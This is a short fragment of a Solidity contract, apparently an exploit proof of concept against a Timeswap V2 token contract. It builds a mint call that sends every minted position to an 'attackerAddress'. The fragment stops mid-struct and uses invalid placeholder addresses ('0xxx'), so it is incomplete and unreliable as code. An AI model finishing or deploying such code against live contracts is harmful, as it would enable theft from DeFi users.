    address payable timeswapV2Token;
    address payable attackerAddress;

    constructor(address _timeswapV2Token) {
        timeswapV2Token = _timeswapV2Token;
        attackerAddress = msg.sender;
    }

    function mint(uint256 _long0Amount, uint256 _long1Amount, uint256 _shortAmount) public {
        TimeswapV2TokenMintParam memory param = TimeswapV2TokenMintParam({
            token0: address(0xxx),
            token1: address(0xxx),
            strike: 0,
            maturity: 0,
            long0To: attackerAddress,
            long1To: attackerAddress,
            shortTo: attackerAddress,
            long0Amount: _long0Amount,
            long1Amount: _long1Amount,
            shortAmount: _shortAmount,
            data: ""
